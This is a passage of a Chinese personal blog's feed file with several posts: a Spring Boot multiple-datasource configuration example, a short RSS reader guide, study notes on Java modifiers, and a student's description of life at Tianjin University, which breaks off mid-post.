class-name">PlatformTransactionManager</span> <span class="token function">fooTxManager</span><span class="token punctuation">(</span><span class="token class-name">DataSource</span> fooDataSource<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">DataSourceTransactionManager</span><span class="token punctuation">(</span>fooDataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span><span class="token string">"bar.datasource"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">DataSourceProperties</span> <span class="token function">barDataSourceProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">DataSourceProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">barDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">DataSourceProperties</span> dataSourceProperties <span class="token operator">=</span> <span class="token function">barDataSourceProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"bar datasource: &#123;&#125;"</span><span class="token punctuation">,</span> dataSourceProperties<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dataSourceProperties<span class="token punctuation">.</span><span class="token function">initializeDataSourceBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">public</span> <span class="token class-name">PlatformTransactionManager</span> <span class="token function">barTxManager</span><span class="token punctuation">(</span><span class="token class-name">DataSource</span> barDataSource<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">DataSourceTransactionManager</span><span class="token punctuation">(</span>barDataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>application.properties</p></blockquote><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">spring.datasource.url</span><span class="token punctuation">=</span><span class="token attr-value">jdbc:mysql://localhost/springbucks</span><span class="token attr-name">spring.datasource.username</span><span class="token punctuation">=</span><span class="token attr-value">springbucks</span><span class="token attr-name">spring.datasource.password</span><span class="token punctuation">=</span><span class="token attr-value">springbucks</span><span class="token attr-name">spring.datasource.driver-class-name</span><span class="token punctuation">=</span><span class="token attr-value">com.mysql.jdbc.Driver(可选)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">management.endpoints.web.exposure.include</span><span class="token punctuation">=</span><span class="token attr-value">*</span><span class="token attr-name">spring.output.ansi.enabled</span><span class="token punctuation">=</span><span class="token attr-value">ALWAYS</span><span class="token attr-name">foo.datasource.url</span><span class="token punctuation">=</span><span class="token attr-value">jdbc:h2:mem:foo</span><span class="token attr-name">foo.datasource.username</span><span class="token punctuation">=</span><span class="token attr-value">sa</span><span class="token attr-name">foo.datasource.password</span><span class="token punctuation">=</span><span class="token attr-name">bar.datasource.url</span><span class="token punctuation">=</span><span class="token attr-value">jdbc:h2:mem:bar</span><span class="token attr-name">bar.datasource.username</span><span class="token punctuation">=</span><span class="token attr-value">sa</span><span class="token attr-name">bar.datasource.password</span><span class="token punctuation">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DataSourse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年，我的RSS订阅</title>
      <link href="/2021/02/25/2021-02-25-2021-%E6%88%91%E7%9A%84RSS%E8%AE%A2%E9%98%85/"/>
      <url>/2021/02/25/2021-02-25-2021-%E6%88%91%E7%9A%84RSS%E8%AE%A2%E9%98%85/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是RSS">什么是RSS</h2><p>简单来说就是自主订阅我想看的资源，信息的聚合。</p><h2 id="订阅源">订阅源</h2><ul><li><p>复制粘贴</p><ul><li><p>一般来说，像博客这类的网站，都有RSS功能</p></li><li><p>还有一些提供RSS源的站点</p><ul><li><a href="https://feedx.top/">FeedX</a></li><li><a href="https://docs.rsshub.app/">RSSHub</a>(不过最近好像打不开)</li></ul></li><li><p>浏览器拓展</p><p><a href="https://chrome.google.com/webstore/detail/rsshub-radar/kefjpfngnndepjbopdmoebkipbgkggaa">RSSHub Radar</a>,通过这个拓展可以查看当前页面是否存在RSS</p></li></ul></li></ul><h2 id="RSS-Reader的选择">RSS Reader的选择</h2><ul><li>UWP应用：Newsflow<ul><li>支持导入OPML</li><li>内置RSS搜索引擎</li></ul></li><li>irreader (win/mac)<ul><li>更像一个浏览器</li><li>订阅的内容更全面</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSS </tag>
            
            <tag> Newsflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java语言中的修饰符</title>
      <link href="/2021/02/24/2021-02-24-Java%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
      <url>/2021/02/24/2021-02-24-Java%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h1>第7章 Java语言中的修饰符</h1><table><thead><tr><th style="text-align:center">修饰符</th><th style="text-align:center">类</th><th style="text-align:center">成员方法</th><th style="text-align:center">构造方法</th><th style="text-align:center">成员变量</th><th style="text-align:center">局部变量</th></tr></thead><tbody><tr><td style="text-align:center">abstract</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">static</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">public</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">protected(受保护的)</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">private(私有的)</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">synchronized(同步的)</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">native(本地的)</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">transient(暂时的)</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">volatile(易失的)</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">final(不可改变)</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">—</td><td style="text-align:center">√</td><td style="text-align:center">√</td></tr></tbody></table><ul><li>修饰顶层：abstract public final(static protected private不能)</li><li>成员方法和成员变量可以有多种修饰符，局部变量只能用final修饰</li></ul><h2 id="7-1-访问控制修饰符">7.1 访问控制修饰符</h2><table><thead><tr><th style="text-align:center">访问级别</th><th style="text-align:center">访问控制修饰符</th><th style="text-align:center">同类</th><th style="text-align:center">同包</th><th style="text-align:center">子类</th><th style="text-align:center">不同的包</th></tr></thead><tbody><tr><td style="text-align:center">公开</td><td style="text-align:center">Public</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td></tr><tr><td style="text-align:center">受保护</td><td style="text-align:center">Protected</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">默认</td><td style="text-align:center">没有访问控制修饰符</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">—</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">私有</td><td style="text-align:center">Private</td><td style="text-align:center">√</td><td style="text-align:center">—</td><td style="text-align:center">—</td><td style="text-align:center">—</td></tr></tbody></table><h2 id="7-2-abstract修饰符">7.2 abstract修饰符</h2><p>abstract修饰符可用来修饰类和成员方法：</p><ul><li>用abstract修饰的类表示抽象类，抽象类位于继承树的<strong>抽象层，<strong>抽象类不能被实例化，即</strong>不允许创建抽象类本身的实例</strong>。没有用abstract修饰的类称为具体类，具体类可以被实例化。</li><li>用abstract修饰的方法表示抽象方法，<strong>抽象方法没有方法体</strong>。抽象方法用来描述系统具有什么功能，但不提供具体的实现。没有用abstract修饰的方法称为具体方法，具体方法具有方法体。</li></ul><p>使用abstarct修饰符需要遵循以下语法规则：</p><ol><li>抽象类中可以没有抽象方法，<strong>但包含了抽象方法的类必须被定义为抽象类</strong>。如果子类没有实现父类中所有的抽象方法，那么子类也必须定义为抽象类，否则编译出错。例如，以下代码中Sub类继承了Base类，但Sub类仅实现了Base类中的method1()抽象方法，而没有实现method2()抽象方法，因此Sub类必须声明为抽象类，否则编译出错：</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Base</span><span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">method1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">method2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//编译出错，Sub必须声明为抽象类</span><span class="token class-name">Class</span> <span class="token class-name">Sub</span> <span class="token keyword">extends</span> <span class="token class-name">Base</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">method1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method1"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>没有抽象静态方法</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Base</span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> method10<span class="token punctuation">;</span><span class="token comment">//编译出错，static和abstract修饰符不能连用</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">method2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>···<span class="token punctuation">&#125;</span><span class="token comment">//合法，抽象类中可以有静态方法</span><span class="token punctuation">&#125;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>抽象类中可以有<strong>非抽象的构造方法</strong>，创建子类的实例时可能会调用这些构造方法，关于父类构造方法的调用规则参见本书第11章的11.2.3节（子类调用父类的构造方法）。抽象类不能被实例化，然而可以<strong>创建一个引用变量，其类型是一个抽象类</strong>，并让它引用非抽象的子类的一个实例。例如：</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Base</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Sub</span> <span class="token keyword">extends</span> <span class="token class-name">Base</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Base</span> base1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//错误:Base是抽象的; 无法实例化</span>        <span class="token class-name">Base</span> base2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>抽象类及抽象方法不能被final修饰符修饰。abstract修饰符与final修饰符不能连用，因为抽象类只有允许创建其子类，它的抽象方法才能被实现，并且只有它的具体子类才能被实例化，而用final修饰的类不允许拥有子类，用final修饰的方法不允许被子类方法覆盖，两此把abstract修饰符与final修饰符连用，会导致自相矛盾。</li><li>抽象方法不能被private修饰符修饰。这是因为如果<strong>方法是抽象的</strong>，表示父类只声明具备某种功能，但没有提供实现。这种方法有待于<strong>某个子类去实现它</strong>。则abstract必须可见。假如Java允许把父类的方法同时用abstract和private修饰，那就意味着在父类中声明一个永远无法实现的方法，所以在Java中不允许出现这一情况。</li></ol><h2 id="7-3-final修饰符">7.3 final修饰符</h2><p>final具有“不可改变的”的含义，它可以修饰非抽象类、非抽象成员方法和变量：</p><ul><li>用final修饰的类不能被继承，没有子类。</li><li>用final修饰的方法不能被子类的方法覆盖。</li><li>用final修饰的变量表示常量，只能被赋一次值。</li></ul><blockquote><p>final不能用来修饰构造方法，因为“方法覆盖”这一概念仅适用于类的成员方法，<span style = "color: red"><strong>而不适用于类的构造方法</strong></span>，父类的构造方法和子类构造方法之间不存在覆盖关系，因此private类型的方法默认为final</p></blockquote><h3 id="7-3-1-final类">7.3.1 final类</h3><blockquote><blockquote><p>在第6章的6.7.3节（继承关系的最大弱点：打破封装）曾经指出，继承关系的弱点是打破封装，子类能够</p></blockquote><p>访问父类的实现细节，而且能以方法覆盖的方式修改实现细节。在以下情况，可以考虑把类定义为final类型，使得这个类不能被继承：</p></blockquote><ul><li>不是专门为继承而设计的类，类本身的方法之间有复杂的调用关系。假如随意创建这些类的子类，子类有可能会错误地修改父类的实现细节。</li><li>出于安全的原因，类的实现细节不允许有任何改动。</li><li>在创建对象模型时，确信这个类不会再被扩展。</li></ul><h3 id="7-3-2-final方法">7.3.2 final方法</h3><p>在某些情况下，出于安全的原因，父类不允许子类覆盖某个方法，此时可以把这个方法声明为final类型。</p><h3 id="7-3-3-final-变量">7.3.3 final 变量</h3><blockquote><p>用final修饰的变量表示取值不会改变的常量。final变量具有以下特征:</p></blockquote><ol><li>final修饰符可以修饰<strong>静态变量</strong>、<strong>实例变量</strong>和**局部变量，**分别表示静态常量、实例常量和局部常量。例如，某个中学的学生都有出生日期、姓名和年龄这些属性，其中学生的出生日期永远不会改变，姓名有可能改变，年龄每年都会变化。此外，该中学在招收学生时，对学生的年龄做了限制，只会招收年龄在10~23岁的学生。以下<br>是Student类的源程序，其中学生的最大年龄及最小年龄为静态常量，学生的出生日期为实例常量。</li><li>final类型的变量都必须显式初始化</li><li>final变量只能赋一次值。例如，以下程序代码试图给var1实例常量和var局部常量赋两次值，并且试图改变final类型的参数param的值，这会导致编译错误：</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sample</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> varl<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//定义并初始化varl实例常量</span><span class="token keyword">public</span> <span class="token class-name">Sample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>varl<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//编译出错，不允许改变varl实例常量的值</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">int</span> param<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">final</span> <span class="token keyword">int</span> var2<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//定义并初始化var2局部常量</span>var2<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//编译出错，不允许改变var2局部常量的值</span>param<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//编译出错，不允许改变final类型参数的值</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>如果将引用类型的变量用final修饰，那么该变量只能始终引用一个对象，但可以改变对象的内容，例如：</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sample</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token keyword">var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Sample</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">var</span> <span class="token operator">=</span> <span class="token keyword">var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">Sample</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sample</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//合法，定义并初始化 final类型的引用变量s</span>        s<span class="token punctuation">.</span><span class="token keyword">var</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token comment">//合法，修改引用变量s所引用的Sample对象的var属性</span>        s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sample</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//编译出错，不能改变引用变量s所引用的Sample对象</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-4-static-修饰符">7.4 static 修饰符</h2><p>static修饰符可以用来修饰类的成员变量、成员方法和代码块：</p><ul><li>用static修饰的成员变量表示静态变量，可以直接通过类名来访问。</li><li>用static修饰的成员方法表示静态方法，可以直接通过类名来访问。</li><li>用static修饰的程序代码块表示静态代码块，当Java虚拟机加载类时，就会执行该代码块。</li></ul><h3 id="7-4-1-static-变量">7.4.1 static 变量</h3><ul><li><p>类的成员变量有两种：一种是被static修饰的变量，叫类变量，或静态变量；一种是没有被static修饰的变量，叫实例变量</p></li><li><p>在类的内部，可以在任何方法内直接访问静态变量；在其他类中，可以通过某个<br>类的类名来访问它的静态变量。</p></li><li><p>static变量在某种程度上与其他语言（如C语言）中的全局变量相似。Java语言不支持不属于任何类的全局变量，静态变量提供了这一功能，它有两个作用：</p><ul><li><p>能被类的所有实例共享，可作为实例之间进行交流的共享数据。</p></li><li><p>如果类的所有实例都包含一个相同的常量属性，可把这个属性定义为静态常量类型，从而节省内存空间。例如某种类型的变压器Transformer类，它所接受的最小输入电压为110V,最大输入电压为220V,输出电压为15V,这是对所有变压器Transformer对象适用的属性，可在Transformer类中按如下方式定义它们：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MAX <span class="token class-name">INPUT</span> VOLTAGE<span class="token operator">=</span><span class="token number">220</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MIN_INPUT_VOLTAGE<span class="token operator">=</span><span class="token number">110</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> OUTPUT_VOLTAGE<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="7-4-2-staic方法">7.4.2 staic方法</h3><p>成员方法分为静态方法和实例方法。用static修饰的方法叫静态方法或类方法。青态方法也和静态变量一样，不需创建类的实例，可以直接通过类名来访问.</p><h3 id="7-4-3-static-代码块">7.4.3 static 代码块</h3><p>类中可以包含静态代码块，它不存在于任何方法体中。Java虚拟机加载类时，会执行这些静态代码块。如果类中包含多个静态块，那么Java虚拟机按它们在类中出现的顺序依次执行它们，每个静态代码块只会被执行一次。例如以下Sample类中包含两个静态代码块。运行Sample类的main()方法时，Java虚拟机首先加载Sample类，在加载的过程中依次执行两个静态代码块。Java虚拟机机载Sample类后，再执行main()方法：</p><h3 id="7-4-4-用-static-进行静态导入">7.4.4 用 static 进行静态导入</h3><p>从JDK5开始引入了静态导入语法（import static),其目的是为了在需要经常访问同一个类的方法或成员变量的场合，简化程序代码。</p><h2 id="7-5-小结">7.5 小结</h2><ol><li>访问控制修饰符<ul><li>public的访问级别最高，其次是protected、默认和private。</li><li>成员变量和成员方法可以处于4个访问级别中的一个：公开、受保护、默认或私有。</li><li>顶层类可以处于公开或默认级别，顶层类不能被protected和private修饰。</li><li>局部变量不能被访问控制修饰符修饰。</li></ul></li><li>abstract修饰符<ul><li>抽象类不能被实例化</li><li>抽象类中可以没有抽象方法，但包含抽象方法的类必须为抽象方法</li><li>如果子类没有实现父类中所有的抽象方法，则子类也必须定义为抽象类</li><li>抽象类不能定义为final和static类型</li><li>抽象方法不能定义为private，final，static类型</li><li>没有抽象构造方法</li><li>抽象方法没有方法体</li></ul></li><li>final修饰符<ul><li>用final修饰的类不能被继承。</li><li>用final修饰的方法不能被子类的方法覆盖。</li><li>private类型的方法都默认为final方法，因而不能被子类的方法覆盖。</li><li>final类型的变量必须被显式初始化，并且只能被赋一次值。</li></ul></li><li>static修饰符<ul><li>静态变量在内存中只有一个备份，在类的所有实例中共享。</li><li>在静态方法中不能直接访问实例方法和实例变量。</li><li>静态方法中不能使用this和super关键字。</li><li>静态方法不能被 abstract 修饰。</li><li>静态方法和静态变量都可以通过类名直接被访问。</li><li>当类被加载时，静态代码块只被执行一次。类中不同的静态代码块按它们在类中出现的顺序被依次执行。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Modifiers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我所认识的天大</title>
      <link href="/2021/02/24/2021-02-24-%E6%88%91%E6%89%80%E8%AE%A4%E8%AF%86%E7%9A%84%E5%A4%A9%E5%A4%A7/"/>
      <url>/2021/02/24/2021-02-24-%E6%88%91%E6%89%80%E8%AE%A4%E8%AF%86%E7%9A%84%E5%A4%A9%E5%A4%A7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在天大已经一个学期了，根据自己有限的经历，聊一聊我在天大(主要是在卫津路校区)的生活</p></blockquote><span id="more"></span><blockquote><p>先看视频</p></blockquote><div style="position: relative; padding: 30% 45%;"><iframe style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;" src="https://player.bilibili.com/player.html?aid=884018784&bvid=BV1cK4y1v7mt&cid=219408334&page=1&as_wide=1&high_quality=1&danmaku=0" frameborder="no" scrolling="no"></iframe></div><h2 id="写在前面">写在前面</h2><p><font face = "KaiTi">当我在高中的时候，其实对大学没什么概念，所以对大学了解也比较少。当我的同学在网上查看大学信息时，我的目光可能还停留在高中。这也就决定了，我来到天大，单纯是因为分数和专业的原因。在来之前，谈不上有什么感情可言。不过，来到天大之后，感觉自己还是蛮幸运的，符合我对大学的心理预期。</font></p><h2 id="学习">学习</h2><blockquote><p>咱们都是学生，自然离不开学习（至于学习怎么定义，那是自己的事）。</p></blockquote><ul><li><p>学习氛围</p><p>天大的学习氛围还是非常<em>nice</em> 的，虽然没有像一些大学的强制自习，但教学楼的自习室常年有人，无论是在<span style="color:red">考试周</span>，还是日常的学习生活。另一个自习的地方就是图书馆了，临近考试的时候，一般来说，图书馆里的自习室一般都是满员（北洋园那边情况好像稍好点，毕竟图书馆大）。平时在路上，你可以听到一些高年级的学生，在谈论着我听不懂的东西，可以说学习氛围非常浓厚了。还有就是我们有自己的<strong>学习</strong>群，平时不会的问题，基本上都可以得到解答。</p></li></ul><div class="text" style=" text-align:center"><font face = "KaiTi">只要<font size = "5">专业</font>选得好<br>年年期末赛<font size = "5">高考</font></font></div><p><a href="https://wiki.tjubot.cn/search/%E8%87%AA%E4%B9%A0%E5%AE%A4/">关于自习室的选择</a></p><ul><li><p>老师素质</p><p>到目前为止，我在天大见到的老师。虽然不能说都是神仙老师，但已经远远超过了我的预期。印象比较深刻的就是<a href="http://faculty.tju.edu.cn/997151/zh_CN/index.htm">金应龙</a>、<a href="http://cam.tju.edu.cn/faculty/teacherDetail.php?id=77">胡二彦</a>老师，可以说都是大佬了。每个老师都有自己的讲课风格，讲课态度确实认真，偶有失误，在同学的提醒下，也会及时纠错。可以说，上课跟着老师的节奏，到最后考试的成绩也不会很差。之前我们辅导员说过：“本科生教学，只是大学教育很小的一部分。”在天大这样的工科院校更是如此，所以一定要<font size = "4">多问</font>,老师也有自己的科研任务。</p></li><li><p>图书馆</p><blockquote><p>强烈推荐大家有时间去郑东图书馆看看</p></blockquote><p>没事多去图书馆转转，还是有很多宝藏地方可以挖掘的。大学四年，这么好的资源不利用的话，确实可惜。一些在市面上买不到的书，也可以找到。</p></li></ul><h2 id="宿舍">宿舍</h2><blockquote><p>作为我们宿舍中最能宅的人之一，我还是很有发言权的，以下主要是鹏翔二斋的情况</p></blockquote><ul><li><p>硬件设施</p><ul><li>六人间，上床下桌，配有阳台，镜子，大容量书架</li><li>网络全覆盖，在高峰时期，无线网的体验较差，个人推荐有线网（目前因为疫情，未按流量计费）</li><li>每层配有两个水房，两个卫生间，配有电吹风（<span style  = "color:red">注意</span>:zap:：禁止携带<a href="https://wiki.tjubot.cn/life/prohibited-ea">违禁电器</a>)</li><li>有宿舍自习室（不过需要向宿管申请）</li><li>入口处有自助贩卖机，打印机</li><li>配有两部电梯，高峰时间比较拥挤</li><li>一层有自助洗衣机，洗鞋机，热水房</li></ul><p><img src="https://i.loli.net/2021/01/27/XkrGpcza4b2J7yh.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/01/27/3lRm2eGMqVObcjD.png" alt="image.png"></p></li><li><p>其他</p><ul><li>垃圾有专人清扫，还是鼓励大家注意个人卫生</li><li>宿舍硬件问题可以线上报修通过“<font size = "4" color = "blue">天大后勤</font>”公众号，效率很高，个人亲测</li></ul></li></ul><h2 id="食堂">食堂</h2><blockquote><p>天大是南开的食堂（不接受任何反驳:clown_face:)</p></blockquote><p>相关班级的推送</p><ul><li><a href="https://mp.weixin.qq.com/s/yojmk6ofkw4RW5Q_tVmQtQ">吃遍天大（一）</a></li><li><a href="https://mp.weixin.qq.com/s/cfwxt8iuHS7DlGVx6MfKvg">吃遍天大（二）</a></li><li><a href="https://mp.weixin.qq.com/s/25khTLy-BPjN_h8AM1TTBA">吃遍天大（三）</a></li></ul><p>个人推荐去学一、学三、学四。更多的还需要大家自己去探索。</p><p><img src="http://8.131.246.244/upload/2021/01/2td0qu24tch61rtjlq9ecdh0vl.png" alt=""></p><p><img 